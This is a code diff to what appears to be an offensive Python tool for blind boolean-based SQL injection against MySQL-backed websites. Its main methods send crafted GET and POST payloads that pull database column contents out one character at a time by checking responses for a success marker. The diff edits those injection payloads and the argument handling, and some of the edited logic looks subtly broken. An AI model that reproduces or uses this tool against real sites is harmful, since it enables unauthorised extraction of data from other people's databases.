@@ -4,7 +4,7 @@ import argparse
 import keyboard
 import sys
 from treelib import Node, Tree
-from string import ascii_lowercase
+from string import ascii_letters
 from string import digits
 from string import punctuation
 from bs4 import BeautifulSoup
@@ -66,22 +66,22 @@ class Mysql:
 		           
 
 	def substr_row_get(self):
-		charset = [str(i) for i in ascii_lowercase + digits + punctuation]
+		charset = [str(i) for i in ascii_letters + digits + punctuation]
 		print(f"{Fore.WHITE}[{Fore.YELLOW}Substring{Fore.WHITE}]: ", end='', flush=True)
 		for a in range(0, int(self.length)):
 			for b in charset:
-				target = requests.get(self.url + f"{self.endpoint} and (select substr({self.column_name}, " + str(a) + ", 1)=0x" + str(b).encode("utf8").hex() +  ")#")
+				target = requests.get(self.url + f"{self.endpoint} and (select ascii((select substr({self.column_name}, " + str(a) + ", 1)))=0x" + str(b).encode("utf8").hex() +  ")#")
 				if self.sign in target.text:
 					print(f"{Fore.GREEN}{b}", end='', flush=True)
 					if keyboard.read_key() == "enter":
 						break
 
 	def substr_row_post(self):
-		charset = [str(i) for i in ascii_lowercase + digits + punctuation]
+		charset = [str(i) for i in ascii_letters + digits + punctuation]
 		print(f"{Fore.WHITE}[{Fore.YELLOW}Substring{Fore.WHITE}]: ", end='', flush=True)
 		for a in range(0, int(self.length)):
 			for b in charset:
-				target = requests.post(self.url, data={f"{self.data}":f"{self.endpoint} and (select substr({self.column_name}, " + str(a) + ", 1)=0x" + str(b).encode("utf8").hex() +  ")#"})
+				target = requests.post(self.url, data={f"{self.data}":f"{self.endpoint} and (select ascii((select substr({self.column_name}, " + str(a) + ", 1)))=0x" + str(b).encode("utf8").hex() +  ")#"})
 				if self.sign in target.text:
 					print(f"{Fore.GREEN}{b}", end='', flush=True)
 					if keyboard.read_key() == "enter":
@@ -150,47 +150,48 @@ def main():
 	parser.add_argument('-filekeyword', '--filekeyword', dest='filekeyword')
 	parser.add_argument('-filelinks', '--filelinks', dest='filelinks')
 	parser.add_argument('-pages', '--pages', dest='pages')
+	parser.print_help()
 	args = parser.parse_args()
 
 	if args.length_row_get:
+		clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
 		if args.endpoint is None:
 			args.endpoint = "+"
-			clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
-			length_row_get = Mysql(args.url, args.column, False, args.sign, False, args.endpoint, False, False, False, False)
-			info = Mysql(args.url, args.column, False, args.sign, False, args.endpoint, False, False, False, False)
-			clear.clear_term()
-			info.info()
-			length_row_get.length_row_get()
+		length_row_get = Mysql(args.url, args.column, False, args.sign, False, args.endpoint, False, False, False, False)
+		info = Mysql(args.url, args.column, False, args.sign, False, args.endpoint, False, False, False, False)
+		clear.clear_term()
+		info.info()
+		length_row_get.length_row_get()
 
 	if args.length_row_post:
+		clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
 		if args.endpoint is None:
-			clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
 			args.endpoint = "+"
-			length_row_post = Mysql(args.url, args.column, False, args.sign, args.data, args.endpoint, False, False, False, False)
-			info = Mysql(args.url, args.column, False, args.sign, args.data, args.endpoint, False, False, False, False)
-			clear.clear_term()
-			info.info()
-			length_row_post.length_row_post()
+		length_row_post = Mysql(args.url, args.column, False, args.sign, args.data, args.endpoint, False, False, False, False)
+		info = Mysql(args.url, args.column, False, args.sign, args.data, args.endpoint, False, False, False, False)
+		clear.clear_term()
+		info.info()
+		length_row_post.length_row_post()
 
 	if args.substr_row_get:
+		clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
 		if args.endpoint is None:
-			clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
 			args.endpoint = "+"
-			substr_row_get = Mysql(args.url, args.column, args.length, args.sign, False, args.endpoint,False, False, False, False)
-			info = Mysql(args.url, args.column, args.length, args.sign, False, args.endpoint, False, False, False, False)
-			clear.clear_term()
-			info.info()
-			substr_row_get.substr_row_get()
+		substr_row_get = Mysql(args.url, args.column, args.length, args.sign, False, args.endpoint,False, False, False, False)
+		info = Mysql(args.url, args.column, args.length, args.sign, False, args.endpoint, False, False, False, False)
+		clear.clear_term()
+		info.info()
+		substr_row_get.substr_row_get()
 
 	if args.substr_row_post:
+		clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
 		if args.endpoint is None:
-			clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
 			args.endpoint = "+"
-			substr_row_post = Mysql(args.url, args.column, args.length, args.sign, args.data, args.endpoint, False, False, False, False)
-			info = Mysql(args.url, args.column, args.length, args.sign, args.data, args.endpoint, False, False, False, False)
-			clear.clear_term()
-			info.info()
-			substr_row_post.substr_row_post()
+		substr_row_post = Mysql(args.url, args.column, args.length, args.sign, args.data, args.endpoint, False, False, False, False)
+		info = Mysql(args.url, args.column, args.length, args.sign, args.data, args.endpoint, False, False, False, False)
+		clear.clear_term()
+		info.info()
+		substr_row_post.substr_row_post()
 
 	if args.urlfilter:
 		clear = Mysql(False, False, False, False, False, False, False, False, False, "cls" if os.name == "nt" else "clear")
@@ -204,6 +205,8 @@ def main():
 		clear.clear_term()
 		sqlinjectable.sqlinjectable()
 
-	print(f"{Fore.RED}To show commands set -h or --help as argument{Fore.RESET}")
+	if args is None:
+		args.print_help()
 
-main()
+if __name__ == "__main__":
+	main()
